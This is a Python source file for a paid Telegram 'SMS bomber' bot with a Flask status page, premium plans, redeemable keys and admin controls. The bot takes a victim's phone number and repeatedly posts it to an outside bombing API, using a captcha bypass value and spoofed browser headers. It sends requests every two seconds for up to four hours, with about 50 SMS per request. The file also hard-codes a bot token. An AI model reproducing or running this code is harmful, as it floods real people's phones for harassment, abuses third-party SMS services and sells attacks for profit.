import logging
import asyncio
import time
import random
import json
import os
import threading
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, CallbackQueryHandler, MessageHandler, filters
import aiohttp
from flask import Flask, render_template_string

# ============================================
# FLASK - SIRF HOSTING KE LIYE (BOT LOOK SAME)
# ============================================
app = Flask(__name__)

HTML_PAGE = '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NEUTRON SMS BOMBER</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #0a0a0a; min-height: 100vh; display: flex; justify-content: center; align-items: center; font-family: 'Courier New', monospace; }
        .container { background: linear-gradient(145deg, #1a1a2e, #16213e); border-radius: 20px; padding: 50px 60px; text-align: center; border: 2px solid #e94560; box-shadow: 0 0 50px rgba(233, 69, 96, 0.3); animation: glow 2s ease-in-out infinite alternate; }
        @keyframes glow { from { box-shadow: 0 0 30px rgba(233, 69, 96, 0.2); } to { box-shadow: 0 0 60px rgba(233, 69, 96, 0.5); } }
        .status-icon { font-size: 80px; margin-bottom: 20px; animation: pulse 1.5s ease-in-out infinite; }
        @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.1); } }
        h1 { color: #e94560; font-size: 36px; letter-spacing: 3px; text-shadow: 0 0 20px rgba(233, 69, 96, 0.5); margin-bottom: 15px; }
        .status-text { color: #00ff88; font-size: 24px; font-weight: bold; letter-spacing: 2px; animation: blink 1s step-end infinite; }
        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0; } }
        .sub-text { color: #8892b0; font-size: 14px; margin-top: 20px; letter-spacing: 1px; }
        .line { width: 100%; height: 2px; background: linear-gradient(90deg, transparent, #e94560, transparent); margin: 20px 0; }
        .info { color: #ccd6f6; font-size: 14px; margin-top: 10px; }
        .info span { color: #e94560; font-weight: bold; }
        .footer { color: #8892b0; font-size: 12px; margin-top: 20px; opacity: 0.6; }
    </style>
</head>
<body>
    <div class="container">
        <div class="status-icon">🤖</div>
        <h1>NEUTRON BOMBER</h1>
        <div class="line"></div>
        <div class="status-text">▶ BOT IS RUNNING... 🚀</div>
        <div class="line"></div>
        <div class="info">⚡ Status: <span>ACTIVE</span></div>
        <div class="info">💣 SMS Bomber Bot</div>
        <div class="info">👑 Admin: <span>@rohitxofficial</span></div>
        <div class="footer">© 2026 NEUTRON | All Rights Reserved</div>
    </div>
</body>
</html>
'''

@app.route('/')
def home():
    return render_template_string(HTML_PAGE)

@app.route('/health')
def health():
    return "OK", 200

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)

# ============================================
# BOT - BILKUL SAME LOOK
# ============================================

# Setup logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# APNA BOT TOKEN & DETAILS
BOT_TOKEN = "8639269220:AAE4Df5WOjE6hrLuxVDoEwOVQ-7ghD9Zu4A"
ADMIN_IDS = [8509857910]
ADMIN_USERNAME = "@rohitxofficial"

# Storage
users_data = {}
active_attacks = {}
premium_keys = {}
blocked_users = []

# ============================================
# PREMIUM PLANS
# ============================================

PREMIUM_PLANS = {
    "plan1": {
        "name": "💸 19 - 1 Day",
        "price": "₹19",
        "duration_hours": 24,
        "bomb_time": 4,
        "validity_text": "1 Day"
    },
    "plan2": {
        "name": "💸 59 - 6 Days",
        "price": "₹59",
        "duration_hours": 144,
        "bomb_time": 4,
        "validity_text": "6 Days"
    },
    "plan3": {
        "name": "💸 99 - 15 Days",
        "price": "₹99",
        "duration_hours": 360,
        "bomb_time": 4,
        "validity_text": "15 Days"
    },
    "plan4": {
        "name": "💸 149 - 30 Days",
        "price": "₹149",
        "duration_hours": 720,
        "bomb_time": 4,
        "validity_text": "30 Days"
    }
}

# ============================================
# APIS
# ============================================

APIS = [
    {
        "name": "CallBomberPro",
        "url": "https://api.callbomberpro.shop/api/bomber/mix",
        "method": "POST"
    }
]

# ============================================
# FUNCTIONS
# ============================================

def is_admin(user_id):
    return user_id in ADMIN_IDS

def is_blocked(user_id):
    return str(user_id) in blocked_users

def is_premium(user_id):
    user_str = str(user_id)
    if user_str in users_data and "premium_until" in users_data[user_str]:
        return datetime.now() < datetime.fromisoformat(users_data[user_str]["premium_until"])
    return False

def get_premium_info(user_id):
    user_str = str(user_id)
    if user_str in users_data and "premium_until" in users_data[user_str]:
        premium_until = datetime.fromisoformat(users_data[user_str]["premium_until"])
        time_left = premium_until - datetime.now()
        
        if time_left.total_seconds() > 0:
            days = time_left.days
            hours = time_left.seconds // 3600
            minutes = (time_left.seconds % 3600) // 60
            
            plan_type = users_data[user_str].get("plan_type", "Unknown")
            plan_data = PREMIUM_PLANS.get(plan_type, {})
            plan_name = plan_data.get("name", "Premium")
            
            return {
                "active": True,
                "plan": plan_name,
                "price": plan_data.get("price", "N/A"),
                "days_left": days,
                "hours_left": hours,
                "minutes_left": minutes,
                "bomb_time": users_data[user_str].get("bomb_time", 4),
                "expires": premium_until.strftime("%Y-%m-%d %H:%M")
            }
    return {"active": False}

def add_premium_user(user_id, plan_type):
    user_str = str(user_id)
    plan_data = PREMIUM_PLANS[plan_type]
    duration_hours = plan_data["duration_hours"]
    premium_until = datetime.now() + timedelta(hours=duration_hours)
    
    if user_str not in users_data:
        users_data[user_str] = {}
    
    users_data[user_str]["premium_until"] = premium_until.isoformat()
    users_data[user_str]["plan_type"] = plan_type
    users_data[user_str]["bomb_time"] = 4
    users_data[user_str]["added_at"] = datetime.now().isoformat()
    return True

def remove_premium_user(user_id):
    user_str = str(user_id)
    if user_str in users_data:
        if "premium_until" in users_data[user_str]:
            del users_data[user_str]["premium_until"]
        if "plan_type" in users_data[user_str]:
            del users_data[user_str]["plan_type"]
        if "bomb_time" in users_data[user_str]:
            del users_data[user_str]["bomb_time"]
        return True
    return False

def block_user(user_id):
    user_str = str(user_id)
    if user_str not in blocked_users:
        blocked_users.append(user_str)
        return True
    return False

def unblock_user(user_id):
    user_str = str(user_id)
    if user_str in blocked_users:
        blocked_users.remove(user_str)
        return True
    return False

def stop_user_attack(user_id):
    stopped = False
    for attack_id in list(active_attacks.keys()):
        if active_attacks[attack_id]["user_id"] == user_id:
            del active_attacks[attack_id]
            stopped = True
    return stopped

def stop_my_attack(user_id):
    return stop_user_attack(user_id)

def create_premium_key(plan_type="plan1"):
    key = f"PREMIUM_{plan_type}_{int(time.time())}"
    premium_keys[key] = {
        "plan_type": plan_type,
        "created_at": datetime.now().isoformat(),
        "used": False
    }
    return key

def use_premium_key(key, user_id):
    if key in premium_keys and not premium_keys[key]["used"]:
        premium_keys[key]["used"] = True
        premium_keys[key]["used_by"] = user_id
        premium_keys[key]["used_at"] = datetime.now().isoformat()
        add_premium_user(user_id, premium_keys[key]["plan_type"])
        return True
    return False

def create_progress_bar(percentage, length=10):
    filled = int(length * percentage / 100)
    return '█' * filled + '░' * (length - filled)

# ============================================
# SMS SENDING - CallBomberPro ONLY
# ============================================

async def send_sms(phone):
    try:
        url = "https://api.callbomberpro.shop/api/bomber/mix"
        
        payload = {
            "phone": str(phone),
            "amount": 50,
            "captchaId": "login-only-bypass",
            "userInput": "login-only-bypass",
            "mode": "free",
            "isPaid": False
        }
        
        headers = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 15; RMX3782 Build/AP3A.240617.008; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/150.0.7871.183 Mobile Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Content-Type": "application/json",
            "sec-ch-ua-platform": '"Android"',
            "sec-ch-ua": '"Not;A=Brand";v="8", "Chromium";v="150", "Android WebView";v="150"',
            "sec-ch-ua-mobile": "?1",
            "origin": "https://callbomberpro.shop",
            "x-requested-with": "mark.via.gp",
            "sec-fetch-site": "same-site",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://callbomberpro.shop/",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "priority": "u=1, i"
        }
        
        async with aiohttp.ClientSession() as session:
            async with session.post(
                url,
                data=json.dumps(payload),
                headers=headers,
                timeout=15
            ) as response:
                text = await response.text()
                logger.info(f"[CallBomberPro] {phone} -> {response.status} | {text[:120]}")
                return response.status == 200
    except Exception as e:
        logger.error(f"SMS send error: {e}")
        return False

# ============================================
# BOMBING FUNCTION
# ============================================

async def run_bombing(user_id, phones, duration_minutes, status_msg, context):
    for attack_id, attack in active_attacks.items():
        if attack['user_id'] == user_id:
            if status_msg:
                await context.bot.edit_message_text(
                    chat_id=status_msg.chat_id,
                    message_id=status_msg.message_id,
                    text="❌ **Attack Already Running!**\n\nYou already have an active attack.\nUse 🛑 STOP button to stop it first.",
                    reply_markup=get_main_keyboard(user_id)
                )
            return
    
    attack_id = f"{user_id}_{int(time.time())}"
    active_attacks[attack_id] = {
        'user_id': user_id,
        'phones': phones,
        'start_time': time.time(),
        'requests_sent': 0,
        'success_count': 0
    }
    
    duration_seconds = duration_minutes * 60
    end_time = time.time() + duration_seconds
    update_interval = 3
    last_update = time.time()
    
    while time.time() < end_time and attack_id in active_attacks:
        try:
            current_phone = phones[active_attacks[attack_id]['requests_sent'] % len(phones)]
            
            result = await send_sms(current_phone)
            active_attacks[attack_id]['requests_sent'] += 1
            if result:
                active_attacks[attack_id]['success_count'] += 50  # 50 SMS per call
            
            current_time = time.time()
            if current_time - last_update >= update_interval:
                elapsed = current_time - active_attacks[attack_id]['start_time']
                progress = min(100, (elapsed / duration_seconds) * 100)
                time_left = max(0, end_time - current_time)
                speed = active_attacks[attack_id]['requests_sent'] / max(1, elapsed / 60)
                
                status_text = (
                    f"{'💎' if is_premium(user_id) else '🆓'} **Bombing**\n\n"
                    f"📱 Target: `{current_phone}`\n"
                    f"📊 Requests: {active_attacks[attack_id]['requests_sent']}\n"
                    f"✅ SMS Sent: {active_attacks[attack_id]['success_count']}\n"
                    f"⚡ Speed: {speed:.1f} req/min\n"
                    f"⏰ Left: {int(time_left//60)}m {int(time_left%60)}s\n\n"
                    f"{create_progress_bar(progress)} {progress:.1f}%\n"
                    "📡 Sending 50 SMS/request...\n\n"
                    "🛑 Click STOP button to stop attack"
                )
                
                try:
                    if status_msg:
                        await context.bot.edit_message_text(
                            chat_id=status_msg.chat_id,
                            message_id=status_msg.message_id,
                            text=status_text,
                            parse_mode='Markdown',
                            reply_markup=get_attack_keyboard()
                        )
                except:
                    pass
                
                last_update = current_time
            
            await asyncio.sleep(2)
            
        except Exception as e:
            logger.error(f"Bombing error: {e}")
            await asyncio.sleep(2)
    
    if attack_id in active_attacks:
        stats = active_attacks[attack_id]
        del active_attacks[attack_id]
        
        completion_text = (
            f"✅ **Complete!**\n\n"
            f"📱 Targets: {len(phones)}\n"
            f"📊 Requests: {stats['requests_sent']}\n"
            f"✅ SMS Sent: {stats['success_count']}\n"
            f"⏰ Duration: {duration_minutes} minutes\n\n"
            f"🎯 Ready for next!"
        )
        
        try:
            if status_msg:
                await context.bot.edit_message_text(
                    chat_id=status_msg.chat_id,
                    message_id=status_msg.message_id,
                    text=completion_text,
                    parse_mode='Markdown',
                    reply_markup=get_main_keyboard(user_id)
                )
        except:
            pass

# ============================================
# KEYBOARDS - BILKUL SAME
# ============================================

def get_main_keyboard(user_id):
    keyboard = []
    
    if is_admin(user_id):
        keyboard.append([InlineKeyboardButton("👑 Admin Panel", callback_data="admin_panel")])
    
    if is_premium(user_id):
        premium_info = get_premium_info(user_id)
        if premium_info["active"]:
            keyboard.append([InlineKeyboardButton(f"💎 {premium_info['plan']} Active", callback_data="premium_status")])
    
    keyboard.append([
        InlineKeyboardButton("💣 BOMB", callback_data="start_bombing"),
        InlineKeyboardButton("💎 PREMIUM", callback_data="premium_menu")
    ])
    
    keyboard.append([
        InlineKeyboardButton("🔑 REDEEM", callback_data="use_code"),
        InlineKeyboardButton("🛑 STOP", callback_data="stop_my_attack")
    ])
    
    return InlineKeyboardMarkup(keyboard)

def get_attack_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🛑 STOP", callback_data="stop_my_attack")]
    ])

def get_premium_plans_keyboard():
    keyboard = [
        [InlineKeyboardButton("💸 19 - 1 Day", callback_data="premium_buy_plan1")],
        [InlineKeyboardButton("💸 59 - 6 Days", callback_data="premium_buy_plan2")],
        [InlineKeyboardButton("💸 99 - 15 Days", callback_data="premium_buy_plan3")],
        [InlineKeyboardButton("💸 149 - 30 Days", callback_data="premium_buy_plan4")],
        [InlineKeyboardButton("📞 Contact Owner", url=f"https://t.me/{ADMIN_USERNAME[1:]}")],
        [InlineKeyboardButton("⬅️ Back", callback_data="back_main")]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_admin_keyboard():
    keyboard = [
        [InlineKeyboardButton("👥 User Management", callback_data="admin_users")],
        [InlineKeyboardButton("🔑 Premium Keys", callback_data="admin_keys")],
        [InlineKeyboardButton("🚫 Block Users", callback_data="admin_block")],
        [InlineKeyboardButton("⏹️ Stop Attacks", callback_data="admin_stop")],
        [InlineKeyboardButton("📊 Stats", callback_data="admin_stats")],
        [InlineKeyboardButton("🔙 Main Menu", callback_data="back_main")]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_user_management_keyboard():
    keyboard = [
        [InlineKeyboardButton("➕ Add Premium", callback_data="add_premium")],
        [InlineKeyboardButton("➖ Remove Premium", callback_data="remove_premium")],
        [InlineKeyboardButton("👀 View Users", callback_data="view_users")],
        [InlineKeyboardButton("🔙 Admin Panel", callback_data="admin_panel")]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_premium_keys_keyboard():
    keyboard = [
        [InlineKeyboardButton("🔑 Generate Key", callback_data="generate_key")],
        [InlineKeyboardButton("📋 Key List", callback_data="key_list")],
        [InlineKeyboardButton("🔙 Admin Panel", callback_data="admin_panel")]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_plan_selection_keyboard():
    keyboard = [
        [InlineKeyboardButton("💸 19 - 1 Day", callback_data="admin_plan_plan1")],
        [InlineKeyboardButton("💸 59 - 6 Days", callback_data="admin_plan_plan2")],
        [InlineKeyboardButton("💸 99 - 15 Days", callback_data="admin_plan_plan3")],
        [InlineKeyboardButton("💸 149 - 30 Days", callback_data="admin_plan_plan4")],
        [InlineKeyboardButton("🔙 Back", callback_data="admin_keys")]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_cancel_keyboard():
    return InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="cancel")]])

def get_block_users_keyboard():
    keyboard = [
        [InlineKeyboardButton("🚫 Block User", callback_data="block_user")],
        [InlineKeyboardButton("✅ Unblock User", callback_data="unblock_user")],
        [InlineKeyboardButton("👀 Blocked List", callback_data="blocked_list")],
        [InlineKeyboardButton("🔙 Admin Panel", callback_data="admin_panel")]
    ]
    return InlineKeyboardMarkup(keyboard)

# ============================================
# START COMMAND
# ============================================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if is_blocked(user_id):
        await update.message.reply_text("🚫 You are blocked from using this bot.")
        return
    
    welcome_text = (
        "💣 **SMS BOMBER BOT**\n\n"
        "⚡ 50 SMS per request\n"
        "🆓 Free: 1 minute bombing\n"
        "💎 Premium: 4 hours bombing\n\n"
        "📞 Send phone number to start!\n"
        "Example: `919876543210`\n\n"
        "🛑 STOP button available"
    )
    
    await update.message.reply_text(
        welcome_text, 
        parse_mode='Markdown',
        reply_markup=get_main_keyboard(user_id)
    )

# ============================================
# BUTTON HANDLER
# ============================================

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    
    if is_blocked(user_id):
        await query.edit_message_text("🚫 You are blocked from using this bot.")
        return
    
    data = query.data

    if data == "stop_my_attack":
        if stop_my_attack(user_id):
            await query.edit_message_text(
                "🛑 **Attack Stopped!**\n\nYour bombing attack has been successfully stopped.",
                reply_markup=get_main_keyboard(user_id)
            )
        else:
            await query.edit_message_text(
                "ℹ️ **No Active Attack**\n\nYou don't have any active bombing attack running.",
                reply_markup=get_main_keyboard(user_id)
            )
        return

    if data == "premium_menu":
        await query.edit_message_text(
            "💎 **Premium Plans**\n\n"
            "⚡ Extended bombing duration (4 hours)\n"
            "⚡ Priority support\n"
            "⚡ Advanced bombing options\n"
            "⚡ Real-time bombing statistics\n\n"
            "Choose a plan:\n",
            parse_mode='Markdown',
            reply_markup=get_premium_plans_keyboard()
        )
        return

    if data.startswith("premium_buy_"):
        plan_id = data.replace("premium_buy_", "")
        if plan_id in PREMIUM_PLANS:
            plan_data = PREMIUM_PLANS[plan_id]
            
            await query.edit_message_text(
                f"📞 **Contact Owner**\n\n"
                f"💎 Plan: {plan_data['name']}\n"
                f"💰 Price: {plan_data['price']}\n"
                f"⏰ Bombing: {plan_data['bomb_time']} Hours\n"
                f"📅 Validity: {plan_data['validity_text']}\n\n"
                f"👤 **Owner:** {ADMIN_USERNAME}\n\n"
                f"💬 Click on owner username above to chat!\n"
                f"📝 Tell owner which plan you want.\n\n"
                f"✅ Owner will activate your premium!",
                parse_mode='Markdown',
                reply_markup=get_main_keyboard(user_id)
            )
        return

    if data == "use_code":
        context.user_data['waiting_for_code'] = True
        await query.edit_message_text(
            "🔑 **Enter Premium Key**\n\n"
            "Send your premium key to activate:\n"
            "Example: `PREMIUM_plan1_1234567890`",
            parse_mode='Markdown',
            reply_markup=get_cancel_keyboard()
        )
        return

    if data == "start_bombing":
        duration = 1 if not is_premium(user_id) else 240
        text = (
            f"{'🆓' if not is_premium(user_id) else '💎'} **Start Bombing**\n\n"
            f"⏰ Duration: {duration} minute{'s' if duration > 1 else ''}\n"
            f"⚡ Speed: 50 SMS/request\n\n"
            f"📱 Send phone number:\nExample: `919876543210`"
        )
        context.user_data['attack_type'] = 'direct'
        await query.edit_message_text(
            text,
            parse_mode='Markdown',
            reply_markup=get_cancel_keyboard()
        )
        return

    if data == "premium_status":
        premium_info = get_premium_info(user_id)
        if premium_info["active"]:
            text = (
                f"💎 **Premium Active**\n\n"
                f"📌 Plan: {premium_info['plan']}\n"
                f"💰 Price: {premium_info['price']}\n"
                f"⏳ Time Left: {premium_info['days_left']}d {premium_info['hours_left']}h\n"
                f"📅 Expires: {premium_info['expires']}"
            )
            await query.edit_message_text(
                text,
                parse_mode='Markdown',
                reply_markup=get_main_keyboard(user_id)
            )
        return

    # ADMIN PANEL
    if data == "admin_panel" and is_admin(user_id):
        total_users = len(users_data)
        premium_users = len([u for u in users_data.values() if "premium_until" in u])
        active_attacks_count = len(active_attacks)
        stats_text = (
            f"👑 **Admin Panel**\n\n"
            f"📊 **Statistics:**\n"
            f"• Total Users: {total_users}\n"
            f"• Premium Users: {premium_users}\n"
            f"• Blocked Users: {len(blocked_users)}\n"
            f"• Active Attacks: {active_attacks_count}\n"
            f"• Premium Keys: {len(premium_keys)}"
        )
        await query.edit_message_text(stats_text, parse_mode='Markdown', reply_markup=get_admin_keyboard())
        return
    
    if data == "admin_users" and is_admin(user_id):
        await query.edit_message_text("👥 **User Management**", reply_markup=get_user_management_keyboard())
        return
    
    if data == "add_premium" and is_admin(user_id):
        context.user_data['admin_action'] = 'add_premium'
        await query.edit_message_text(
            "➕ **Add Premium User**\n\nSend user ID:",
            reply_markup=get_cancel_keyboard()
        )
        return
    
    if data == "remove_premium" and is_admin(user_id):
        context.user_data['admin_action'] = 'remove_premium'
        await query.edit_message_text(
            "➖ **Remove Premium**\n\nSend user ID:",
            reply_markup=get_cancel_keyboard()
        )
        return
    
    if data == "view_users" and is_admin(user_id):
        if not users_data:
            await query.edit_message_text("📭 No users found.", reply_markup=get_user_management_keyboard())
            return
        
        users_text = "👥 **Users List**\n\n"
        for i, (uid, user_data) in enumerate(list(users_data.items())[:15]):
            if "premium_until" in user_data:
                premium_until = datetime.fromisoformat(user_data["premium_until"])
                time_left = premium_until - datetime.now()
                if time_left.total_seconds() > 0:
                    days = time_left.days
                    hours = time_left.seconds // 3600
                    status = f"💎 {days}d {hours}h"
                else:
                    status = "💎 Expired"
            else:
                status = "🆓 Free"
            users_text += f"• {uid} - {status}\n"
        
        await query.edit_message_text(users_text, reply_markup=get_user_management_keyboard())
        return
    
    if data == "admin_keys" and is_admin(user_id):
        unused_keys = len([k for k in premium_keys.values() if not k["used"]])
        await query.edit_message_text(
            f"🔑 **Premium Keys Management**\n\n"
            f"Unused Keys: {unused_keys}\n"
            f"Total Keys: {len(premium_keys)}",
            reply_markup=get_premium_keys_keyboard()
        )
        return
    
    if data == "generate_key" and is_admin(user_id):
        await query.edit_message_text(
            "🔑 **Generate Premium Key**\n\nSelect plan:",
            reply_markup=get_plan_selection_keyboard()
        )
        return
    
    if data.startswith("admin_plan_") and is_admin(user_id):
        plan_id = data.replace("admin_plan_", "")
        if plan_id in PREMIUM_PLANS:
            key = create_premium_key(plan_id)
            plan_data = PREMIUM_PLANS[plan_id]
            await query.edit_message_text(
                f"🔑 **Premium Key Generated**\n\n"
                f"**Plan:** {plan_data['name']}\n"
                f"**Price:** {plan_data['price']}\n\n"
                f"**Key:** `{key}`",
                parse_mode='Markdown',
                reply_markup=get_premium_keys_keyboard()
            )
        return
    
    if data == "key_list" and is_admin(user_id):
        if not premium_keys:
            await query.edit_message_text("📭 No premium keys.", reply_markup=get_premium_keys_keyboard())
            return
        
        key_text = "🔑 **Premium Keys**\n\n"
        for key, key_data in list(premium_keys.items())[:10]:
            status = "✅ Used" if key_data["used"] else "🆓 Available"
            plan_name = PREMIUM_PLANS[key_data["plan_type"]]["name"]
            key_text += f"• {key}\n  {plan_name} - {status}\n"
        
        await query.edit_message_text(key_text, reply_markup=get_premium_keys_keyboard())
        return
    
    if data == "admin_block" and is_admin(user_id):
        await query.edit_message_text("🚫 **Block Users**", reply_markup=get_block_users_keyboard())
        return
    
    if data == "block_user" and is_admin(user_id):
        context.user_data['admin_action'] = 'block_user'
        await query.edit_message_text("🚫 **Block User**\n\nSend user ID:", reply_markup=get_cancel_keyboard())
        return
    
    if data == "unblock_user" and is_admin(user_id):
        context.user_data['admin_action'] = 'unblock_user'
        await query.edit_message_text("✅ **Unblock User**\n\nSend user ID:", reply_markup=get_cancel_keyboard())
        return
    
    if data == "blocked_list" and is_admin(user_id):
        if not blocked_users:
            await query.edit_message_text("📭 No blocked users.", reply_markup=get_block_users_keyboard())
            return
        blocked_text = "🚫 **Blocked Users**\n\n" + "\n".join([f"• {uid}" for uid in blocked_users[:15]])
        await query.edit_message_text(blocked_text, reply_markup=get_block_users_keyboard())
        return
    
    if data == "admin_stop" and is_admin(user_id):
        context.user_data['admin_action'] = 'stop_attack'
        await query.edit_message_text("⏹️ **Stop User Attack**\n\nSend user ID:", reply_markup=get_cancel_keyboard())
        return
    
    if data == "admin_stats" and is_admin(user_id):
        total_requests = sum(attack.get("requests_sent", 0) for attack in active_attacks.values())
        total_success = sum(attack.get("success_count", 0) for attack in active_attacks.values())
        
        stats_text = (
            f"📊 **System Statistics**\n\n"
            f"• Total Users: {len(users_data)}\n"
            f"• Premium Users: {len([u for u in users_data.values() if 'premium_until' in u])}\n"
            f"• Blocked Users: {len(blocked_users)}\n"
            f"• Active Attacks: {len(active_attacks)}\n"
            f"• Total Requests: {total_requests}\n"
            f"• Successful SMS: {total_success}\n"
            f"• Premium Keys: {len(premium_keys)}"
        )
        await query.edit_message_text(stats_text, parse_mode='Markdown', reply_markup=get_admin_keyboard())
        return

    if data == "back_main":
        context.user_data.clear()
        await query.edit_message_text("🔙 Main Menu", reply_markup=get_main_keyboard(user_id))
        return
    
    if data == "cancel":
        context.user_data.clear()
        await query.edit_message_text("❌ Cancelled", reply_markup=get_main_keyboard(user_id))
        return

# ============================================
# MESSAGE HANDLER
# ============================================

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text.strip()
    
    if is_blocked(user_id):
        await update.message.reply_text("🚫 You are blocked from using this bot.")
        return
    
    if context.user_data.get('waiting_for_code'):
        context.user_data['waiting_for_code'] = False
        if use_premium_key(text, user_id):
            plan_type = users_data[str(user_id)]["plan_type"]
            plan_name = PREMIUM_PLANS[plan_type]["name"]
            await update.message.reply_text(
                f"🎉 **Premium Activated!**\n\n"
                f"**Plan:** {plan_name}\n"
                f"**Bombing Time:** 4 Hours\n"
                f"**Speed:** 50 SMS/request",
                reply_markup=get_main_keyboard(user_id)
            )
        else:
            await update.message.reply_text("❌ Invalid or used premium key!", reply_markup=get_main_keyboard(user_id))
        return
    
    if is_admin(user_id) and context.user_data.get('admin_action'):
        action = context.user_data['admin_action']
        context.user_data['admin_action'] = None
        
        if action == 'add_premium' and text.isdigit():
            target_id = int(text)
            context.user_data['add_premium_user'] = target_id
            context.user_data['waiting_for_plan'] = True
            await update.message.reply_text(
                "Select plan:",
                reply_markup=get_plan_selection_keyboard()
            )
            return
        
        elif action == 'remove_premium' and text.isdigit():
            target_id = int(text)
            remove_premium_user(target_id)
            await update.message.reply_text(f"✅ Premium removed from user {target_id}", reply_markup=get_admin_keyboard())
            return
        
        elif action == 'block_user' and text.isdigit():
            target_id = int(text)
            block_user(target_id)
            await update.message.reply_text(f"✅ User {target_id} blocked", reply_markup=get_admin_keyboard())
            return
        
        elif action == 'unblock_user' and text.isdigit():
            target_id = int(text)
            unblock_user(target_id)
            await update.message.reply_text(f"✅ User {target_id} unblocked", reply_markup=get_admin_keyboard())
            return
        
        elif action == 'stop_attack' and text.isdigit():
            target_id = int(text)
            if stop_user_attack(target_id):
                await update.message.reply_text(f"✅ Attack stopped for user {target_id}", reply_markup=get_admin_keyboard())
            else:
                await update.message.reply_text(f"❌ No active attack found for user {target_id}", reply_markup=get_admin_keyboard())
            return
        
        else:
            await update.message.reply_text("❌ Invalid input", reply_markup=get_admin_keyboard())
        return
    
    if context.user_data.get('attack_type'):
        context.user_data['attack_type'] = None
        
        if text.isdigit() and len(text) >= 10:
            phone = text
            duration = 1 if not is_premium(user_id) else 240
            
            for attack_id, attack in active_attacks.items():
                if attack['user_id'] == user_id:
                    await update.message.reply_text(
                        "❌ **Attack Already Running!**\n\n"
                        "You already have an active attack.\n"
                        "Use 🛑 STOP button to stop it first.",
                        reply_markup=get_main_keyboard(user_id)
                    )
                    return
            
            status_msg = await update.message.reply_text(
                f"{'🆓' if not is_premium(user_id) else '💎'} **Starting Attack**\n\n"
                f"📱 Target: `{phone}`\n"
                f"⏰ Duration: {duration} minute{'s' if duration > 1 else ''}\n"
                f"⚡ Speed: 50 SMS/request\n\n"
                f"{create_progress_bar(0)} 0%\n"
                "🚀 Starting...\n\n"
                "🛑 Click STOP button to stop attack",
                parse_mode='Markdown',
                reply_markup=get_attack_keyboard()
            )
            
            asyncio.create_task(run_bombing(user_id, [phone], duration, status_msg, context))
        else:
            await update.message.reply_text("❌ Invalid number! Use format: 919876543210", reply_markup=get_main_keyboard(user_id))
        return
    
    if text.isdigit() and len(text) >= 10:
        phone = text
        
        for attack_id, attack in active_attacks.items():
            if attack['user_id'] == user_id:
                await update.message.reply_text(
                    "❌ **Attack Already Running!**\n\n"
                    "You already have an active attack.\n"
                    "Use 🛑 STOP button to stop it first.",
                    reply_markup=get_main_keyboard(user_id)
                )
                return
        
        duration = 240 if is_premium(user_id) else 1
        
        status_msg = await update.message.reply_text(
            f"{'💎' if is_premium(user_id) else '🆓'} **Starting Attack**\n\n"
            f"📱 Target: `{phone}`\n"
            f"⏰ Duration: {duration} minute{'s' if duration > 1 else ''}\n"
            f"⚡ Speed: 50 SMS/request\n\n"
            f"{create_progress_bar(0)} 0%\n"
            "🚀 Starting...\n\n"
            "🛑 Click STOP button to stop attack",
            parse_mode='Markdown',
            reply_markup=get_attack_keyboard()
        )
        
        asyncio.create_task(run_bombing(user_id, [phone], duration, status_msg, context))
    else:
        await update.message.reply_text(
            "💣 **SMS BOMBER BOT**\n\n"
            "📞 Send phone number to start!\n"
            "Example: `919876543210`\n\n"
            "⚡ **50 SMS per request**\n"
            "🛑 **STOP button available**",
            parse_mode='Markdown',
            reply_markup=get_main_keyboard(user_id)
        )

# ============================================
# MAIN FUNCTION - FLASK + BOT
# ============================================

async def run_bot():
    try:
        print("💣 SMS BOMBER BOT")
        print(f"👑 Owner: {ADMIN_USERNAME}")
        print("📱 2x2 Layout:")
        print("   [💣 BOMB]  [💎 PREMIUM]")
        print("   [🔑 REDEEM] [🛑 STOP]")
        print("💸 Plans: 19, 59, 99, 149")
        print("⚡ 50 SMS per request")
        print("🌐 Web Server running on port 8080")
        
        application = Application.builder().token(BOT_TOKEN).build()
        
        application.add_handler(CommandHandler("start", start))
        application.add_handler(CallbackQueryHandler(button_handler))
        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
        
        print("✅ Bot ready!")
        print("📱 2x2 Layout Active!")
        print(f"📞 Users will DM @{ADMIN_USERNAME[1:]} for premium!")
        
        await application.initialize()
        await application.start()
        await application.updater.start_polling()
        
        while True:
            await asyncio.sleep(1)
            
    except Exception as e:
        print(f"❌ Error: {e}")
        print("🔄 Restarting in 5 seconds...")
        await asyncio.sleep(5)

def main():
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
    print("🌐 Flask web server started on port 8080")
    
    asyncio.run(run_bot())

if __name__ == "__main__":
    main()